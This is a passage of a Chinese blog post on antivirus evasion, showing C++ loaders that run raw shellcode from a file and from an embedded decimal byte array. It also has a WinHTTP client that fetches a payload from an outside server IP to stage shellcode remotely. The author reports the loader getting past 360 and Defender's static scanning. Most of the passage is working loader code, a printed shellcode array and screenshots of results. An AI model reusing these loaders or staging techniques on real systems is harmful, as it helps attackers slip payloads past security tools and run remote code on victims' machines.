class="title">wmain</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> filename[] = <span class="string">&quot;D:\\GitHub\\BypassAV\\calc&quot;</span>;</span><br><span class="line">    <span class="comment">// 以读模式打开文件</span></span><br><span class="line">    ifstream infile;</span><br><span class="line">    <span class="comment">//以二进制方式打开</span></span><br><span class="line">    infile.<span class="built_in">open</span>(filename,ios::out|ios::binary);</span><br><span class="line">    infile.<span class="built_in">seekg</span>(<span class="number">0</span>, infile.end); <span class="comment">//追溯到流的尾部</span></span><br><span class="line">    <span class="type">int</span> length = infile.<span class="built_in">tellg</span>(); <span class="comment">//获取流的长度</span></span><br><span class="line">    infile.<span class="built_in">seekg</span>(<span class="number">0</span>, infile.beg);<span class="comment">//回溯到流头部</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *data = <span class="keyword">new</span> <span class="type">char</span>[length]; <span class="comment">//存取文件内容</span></span><br><span class="line">    <span class="keyword">if</span> (infile.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;reading from the file&quot;</span> &lt;&lt; endl;</span><br><span class="line">        infile.<span class="built_in">read</span>(data, length);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;size of data =&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(data) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;size of file =&quot;</span> &lt;&lt; length &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\%x &quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> shellcode_size = length;</span><br><span class="line">    <span class="built_in">load</span>(data, shellcode_size);</span><br><span class="line">    <span class="comment">//加载成功并不会输出，推测load函数新创建的线程执行结束后，主进程也终止了。</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;加载成功&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下，这里面有两个疑问点，一是data的size为什么是4字节，<code> char *data = new char[length];</code>创建对象，大小为什么不是length的长度。二是data的内容，data[1]输出为<code>\fffffffc</code> 一共是8×4=32比特，4字节。这样算下来整个data内存段的大小远远大于shellcode原本的长度193字节。我第一时间想法是环境问题自动补位了，但其它的data[i]还有8位，4位的长度，补位了却没有完全补？</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220324191126139.png" alt="image-20220324191126139"></p><p>以上问题先留住，这段data内存加载执行是没问题的。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220324193819299.png" alt="image-20220324193819299"></p><p>免杀效果还不错。静态过了360和defender，动态被defender拦截了，毕竟shellcode没混淆加密。</p><blockquote><p>很奇怪，明明加载方式都没变，还是用VirtualAlloc加载的，这次很多杀软没查杀。</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220324194933900.png" alt="image-20220324194933900"></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220324194855090.png" alt="image-20220324194855090"></p><h3 id="从web加载shellcode"><a href="#从web加载shellcode" class="headerlink" title="从web加载shellcode"></a>从web加载shellcode</h3><p>从本地文件中加载只是一种免杀思路，实际利用时远程加载更方便。我能想到的web远程加载形式有两种，一是从socket连接加载，客户端连接c2端口，返回shellcode；二是从http连接加载，访问c2的url返回shellcode。socket加载方式<a href="https://payloads.online/archivers/2019-11-10/5/">倾旋大佬教程的第五课</a>已经实现过了，我现在来写一个http加载。</p><blockquote><p>网上一搜，C++ http请求怎么实现，感觉这画风不对啊，怎么一人一个写法。C++没有python和go那样，把所有的库放一起的网站吗？</p></blockquote><p>找到了微软winsock的文档，<a href="https://docs.microsoft.com/zh-cn/windows/win32/winsock/getting-started-with-winsock">https://docs.microsoft.com/zh-cn/windows/win32/winsock/getting-started-with-winsock</a><br>还有winhttp的文档，<a href="https://docs.microsoft.com/en-us/windows/win32/api/winhttp/">https://docs.microsoft.com/en-us/windows/win32/api/winhttp/</a></p><p>还是看文档比较靠谱，实例<a href="https://www.citext.cn/415.html%E3%80%82">https://www.citext.cn/415.html。</a></p><p><a href="https://www.cnblogs.com/vranger/p/3792791.html">wchar_t 和 char 之间转换 </a>  教程</p><p>http get方法C++实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winhttp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;winhttp.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">WinGet</span><span class="params">(<span class="type">char</span>* ip, <span class="type">int</span> port, <span class="type">char</span>* url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">HINTERNET hSession = <span class="literal">NULL</span>;</span><br><span class="line">HINTERNET hConnect = <span class="literal">NULL</span>;</span><br><span class="line">HINTERNET hRequest = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//************ 将char转换为wchar_t *****************/</span></span><br><span class="line"><span class="type">int</span> ipSize;</span><br><span class="line"><span class="type">wchar_t</span>* ip_wchar;</span><br><span class="line"><span class="comment">//返回接受字符串所需缓冲区的大小，已经包含字符结尾符&#x27;\0&#x27;</span></span><br><span class="line">ipSize = <span class="built_in">MultiByteToWideChar</span>(CP_ACP, <span class="number">0</span>, ip, <span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">//iSize =wcslen(pwsUnicode)+1=6</span></span><br><span class="line">ip_wchar = (<span class="type">wchar_t</span>*)<span class="built_in">malloc</span>(ipSize * <span class="built_in">sizeof</span>(<span class="type">wchar_t</span>)); <span class="comment">//不需要 pwszUnicode = (wchar_t *)malloc((iSize+1)*sizeof(wchar_t))</span></span><br><span class="line"><span class="built_in">MultiByteToWideChar</span>(CP_ACP, <span class="number">0</span>, ip, <span class="number">-1</span>, ip_wchar, ipSize);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> urlSize;</span><br><span class="line"><span class="type">wchar_t</span>* url_wchar;</span><br><span class="line"><span class="comment">//返回接受字符串所需缓冲区的大小，已经包含字符结尾符&#x27;\0&#x27;</span></span><br><span class="line">urlSize = <span class="built_in">MultiByteToWideChar</span>(CP_ACP, <span class="number">0</span>, url, <span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">//iSize =wcslen(pwsUnicode)+1=6</span></span><br><span class="line">url_wchar = (<span class="type">wchar_t</span>*)<span class="built_in">malloc</span>(urlSize * <span class="built_in">sizeof</span>(<span class="type">wchar_t</span>)); <span class="comment">//不需要 pwszUnicode = (wchar_t *)malloc((iSize+1)*sizeof(wchar_t))</span></span><br><span class="line"><span class="built_in">MultiByteToWideChar</span>(CP_ACP, <span class="number">0</span>, url, <span class="number">-1</span>, url_wchar, urlSize);</span><br><span class="line"><span class="comment">//************ ********************************* *****************/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//port = 80; //默认端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1. 初始化一个WinHTTP-session句柄，参数1为此句柄的名称</span></span><br><span class="line">hSession = <span class="built_in">WinHttpOpen</span>(<span class="string">L&quot;WinHTTP Example/1.0&quot;</span>,</span><br><span class="line">WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,</span><br><span class="line">WINHTTP_NO_PROXY_NAME,</span><br><span class="line">WINHTTP_NO_PROXY_BYPASS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hSession == <span class="literal">NULL</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Error:Open session failed: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 通过上述句柄连接到服务器，需要指定服务器IP和端口号 INTERNET_DEFAULT_HTTP_PORT:80。若连接成功，返回的hConnect句柄不为NULL</span></span><br><span class="line">hConnect = <span class="built_in">WinHttpConnect</span>(hSession, ip_wchar, port, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hConnect == <span class="literal">NULL</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Error:Connect failed: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 通过hConnect句柄创建一个hRequest句柄，用于发送数据与读取从服务器返回的数据。</span></span><br><span class="line">hRequest = <span class="built_in">WinHttpOpenRequest</span>(hConnect, <span class="string">L&quot;GET&quot;</span>, url_wchar, <span class="literal">NULL</span>, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//其中参数2表示请求方式，此处为Get；参数3:给定Get的具体地址，如这里的具体地址为https://www.citext.cn/GetTime.php</span></span><br><span class="line"><span class="keyword">if</span> (hRequest == <span class="literal">NULL</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Error:OpenRequest failed: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL bResults;</span><br><span class="line"><span class="comment">//发送请求</span></span><br><span class="line">bResults = <span class="built_in">WinHttpSendRequest</span>(hRequest,</span><br><span class="line">WINHTTP_NO_ADDITIONAL_HEADERS,</span><br><span class="line"><span class="number">0</span>, WINHTTP_NO_REQUEST_DATA, <span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!bResults) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Error:SendRequest failed: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//（3） 发送请求成功则准备接受服务器的response。注意：在使用 WinHttpQueryDataAvailable和WinHttpReadData前必须使用WinHttpReceiveResponse才能access服务器返回的数据</span></span><br><span class="line">bResults = <span class="built_in">WinHttpReceiveResponse</span>(hRequest, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LPVOID lpHeaderBuffer = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwSize = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//4-3. 获取服务器返回数据</span></span><br><span class="line">LPSTR pszOutBuffer = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwDownloaded = <span class="number">0</span>;         <span class="comment">//实际收取的字符数</span></span><br><span class="line"><span class="type">wchar_t</span>* pwText = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (bResults)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//(1) 获取返回数据的大小（以字节为单位）</span></span><br><span class="line">dwSize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WinHttpQueryDataAvailable</span>(hRequest, &amp;dwSize)) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Error：WinHttpQueryDataAvailable failed：&quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!dwSize)    <span class="keyword">break</span>;  <span class="comment">//数据大小为0                </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//(2) 根据返回数据的长度为buffer申请内存空间</span></span><br><span class="line">pszOutBuffer = <span class="keyword">new</span> <span class="type">char</span>[dwSize + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!pszOutBuffer) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Out of memory.&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ZeroMemory</span>(pszOutBuffer, dwSize + <span class="number">1</span>);       <span class="comment">//将buffer置0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//(3) 通过WinHttpReadData读取服务器的返回数据</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WinHttpReadData</span>(hRequest, pszOutBuffer, dwSize, &amp;dwDownloaded)) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Error：WinHttpQueryDataAvailable failed：&quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!dwDownloaded)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (dwSize &gt; <span class="number">0</span>);</span><br><span class="line"><span class="comment">//4-4. 将返回数据转换成UTF8</span></span><br><span class="line">DWORD dwNum = <span class="built_in">MultiByteToWideChar</span>(CP_ACP, <span class="number">0</span>, pszOutBuffer, <span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);    <span class="comment">//返回原始ASCII码的字符数目       </span></span><br><span class="line">pwText = <span class="keyword">new</span> <span class="type">wchar_t</span>[dwNum];                                                <span class="comment">//根据ASCII码的字符数分配UTF8的空间</span></span><br><span class="line"><span class="built_in">MultiByteToWideChar</span>(CP_UTF8, <span class="number">0</span>, pszOutBuffer, <span class="number">-1</span>, pwText, dwNum);           <span class="comment">//将ASCII码转换成UTF8</span></span><br><span class="line"><span class="comment">//printf(&quot;\n返回数据为:\n%S\n\n&quot;, pwText);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//5. 依次关闭request，connect，session句柄</span></span><br><span class="line"><span class="keyword">if</span> (hRequest) <span class="built_in">WinHttpCloseHandle</span>(hRequest);</span><br><span class="line"><span class="keyword">if</span> (hConnect) <span class="built_in">WinHttpCloseHandle</span>(hConnect);</span><br><span class="line"><span class="keyword">if</span> (hSession) <span class="built_in">WinHttpCloseHandle</span>(hSession);</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************   将wchar转换为char  *******************/</span></span><br><span class="line"><span class="type">int</span> iSize;</span><br><span class="line"><span class="type">char</span>* data;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回接受字符串所需缓冲区的大小，已经包含字符结尾符&#x27;\0&#x27;</span></span><br><span class="line">iSize = <span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, pwText, <span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">//iSize =wcslen(pwsUnicode)+1=6</span></span><br><span class="line">data = (<span class="type">char</span>*)<span class="built_in">malloc</span>(iSize * <span class="built_in">sizeof</span>(<span class="type">char</span>)); <span class="comment">//不需要 pszMultiByte = (char*)malloc(iSize*sizeof(char)+1);</span></span><br><span class="line"><span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, pwText, <span class="number">-1</span>, data, iSize, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span>* data;</span><br><span class="line">data = <span class="built_in">WinGet</span>(<span class="string">&quot;101.43.138.109&quot;</span>, <span class="number">2333</span>, <span class="string">&quot;hello.txt&quot;</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;返回的数据为: &quot;</span> &lt;&lt; data &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220324224745142.png" alt="image-20220324224745142"></p><blockquote><p>python一行代码解决的事，C++写了100多行</p></blockquote><p>现在实现了从远程服务器通过http请求获取数据，但又面临一个新问题，shellcode是二进制的，要以二进制数据流加载进内存才能执行。但是GET请求的结果是字符串，有没有办法将二进制数据编码成字符串，再从字符串还原为二进制数据呢？如果上述过程能实现，就能为shellcode在传输过程中的加密解密打开局面，对字符串的处理要比二进制数据要灵活多了。</p><p>如何实现？这个问题说到底就是如何把<code>010100101.....</code>的二进制数据作为可打印字符表示出来，再把这串字符转换回<code>010100101.....</code>，平常见到的shellcode是这样子的。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220325163624084.png" alt="image-20220325163624084"></p><p>\xfc，\xe8这是二进制<code>11111100</code>,<code>11101000</code>,编码为16进制的结果，char类型数组每位大小为1字节、8比特，刚好放下16进制的两位数据（16进制每位4比特）。所以理论上，我们创建一个shellcode_size长度的char数组，每位手动填充和16进制数据，最终这个数组在内存中的状态和直接加载shellcode是完全一样的。C++直接向数据中写16进制数据的方法我没找到，但是我可以填对应的10进制数据。</p><p>首先将shellcode按字节编码成10进制</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220325164742847.png" alt="image-20220325164742847"></p><p>将生成的数据放到char数组中，使用load函数加载。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">2048</span>];</span><br><span class="line"><span class="type">char</span> a[] = &#123;<span class="number">252</span>,<span class="number">232</span>,<span class="number">130</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">137</span>,<span class="number">229</span>,<span class="number">49</span>,<span class="number">192</span>,<span class="number">100</span>,<span class="number">139</span>,<span class="number">80</span>,<span class="number">48</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">12</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">20</span>,<span class="number">139</span>,<span class="number">114</span>,<span class="number">40</span>,<span class="number">15</span>,<span class="number">183</span>,<span class="number">74</span>,<span class="number">38</span>,<span class="number">49</span>,<span class="number">255</span>,<span class="number">172</span>,<span class="number">60</span>,<span class="number">97</span>,<span class="number">124</span>,<span class="number">2</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">193</span>,<span class="number">207</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">199</span>,<span class="number">226</span>,<span class="number">242</span>,<span class="number">82</span>,<span class="number">87</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">16</span>,<span class="number">139</span>,<span class="number">74</span>,<span class="number">60</span>,<span class="number">139</span>,<span class="number">76</span>,<span class="number">17</span>,<span class="number">120</span>,<span class="number">227</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">209</span>,<span class="number">81</span>,<span class="number">139</span>,<span class="number">89</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">211</span>,<span class="number">139</span>,<span class="number">73</span>,<span class="number">24</span>,<span class="number">227</span>,<span class="number">58</span>,<span class="number">73</span>,<span class="number">139</span>,<span class="number">52</span>,<span class="number">139</span>,<span class="number">1</span>,<span class="number">214</span>,<span class="number">49</span>,<span class="number">255</span>,<span class="number">172</span>,<span class="number">193</span>,<span class="number">207</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">199</span>,<span class="number">56</span>,<span class="number">224</span>,<span class="number">117</span>,<span class="number">246</span>,<span class="number">3</span>,<span class="number">125</span>,<span class="number">248</span>,<span class="number">59</span>,<span class="number">125</span>,<span class="number">36</span>,<span class="number">117</span>,<span class="number">228</span>,<span class="number">88</span>,<span class="number">139</span>,<span class="number">88</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">211</span>,<span class="number">102</span>,<span class="number">139</span>,<span class="number">12</span>,<span class="number">75</span>,<span class="number">139</span>,<span class="number">88</span>,<span class="number">28</span>,<span class="number">1</span>,<span class="number">211</span>,<span class="number">139</span>,<span class="number">4</span>,<span class="number">139</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">137</span>,<span class="number">68</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">91</span>,<span class="number">91</span>,<span class="number">97</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">81</span>,<span class="number">255</span>,<span class="number">224</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">90</span>,<span class="number">139</span>,<span class="number">18</span>,<span class="number">235</span>,<span class="number">141</span>,<span class="number">93</span>,<span class="number">106</span>,<span class="number">1</span>,<span class="number">141</span>,<span class="number">133</span>,<span class="number">178</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">80</span>,<span class="number">104</span>,<span class="number">49</span>,<span class="number">139</span>,<span class="number">111</span>,<span class="number">135</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">187</span>,<span class="number">240</span>,<span class="number">181</span>,<span class="number">162</span>,<span class="number">86</span>,<span class="number">104</span>,<span class="number">166</span>,<span class="number">149</span>,<span class="number">189</span>,<span class="number">157</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">60</span>,<span class="number">6</span>,<span class="number">124</span>,<span class="number">10</span>,<span class="number">128</span>,<span class="number">251</span>,<span class="number">224</span>,<span class="number">117</span>,<span class="number">5</span>,<span class="number">187</span>,<span class="number">71</span>,<span class="number">19</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">106</span>,<span class="number">0</span>,<span class="number">83</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>,<span class="number">46</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> shellcode_size = <span class="built_in">sizeof</span>(a);</span><br><span class="line">cout &lt;&lt; <span class="built_in">sizeof</span>(a) &lt;&lt;endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; shellcode_size;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\\x%x&quot;</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">load</span>(a, shellcode_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shellcode成功执行！和上次文件加载的内存相比较，两次的内存数据一模一样。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220325165114721.png" alt="image-20220325165114721"></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220324191126139-16482032127241.png" alt="image-20220324191126139"></p><p>这样一来我们web远程加载的思路就清晰了。</p><p>首先将十进制的数据放到web服务器</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220325165704222.png" alt="image-20220325165704222"></p><p>字符串生成buf数组函数代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *<span class="title">StrToShellcode</span><span class="params">(<span class="type">char</span> str[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">2048</span>];</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> s[<span class="number">2</span>] = <span class="string">&quot;,&quot;</span>;</span><br><span class="line"><span class="type">char</span>* token;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* 获取第一个子字符串 */</span></span><br><span class="line">token = <span class="built_in">strtok</span>(str, s);</span><br><span class="line"><span class="comment">//buf[i] = char(stoi(token)); </span></span><br><span class="line"><span 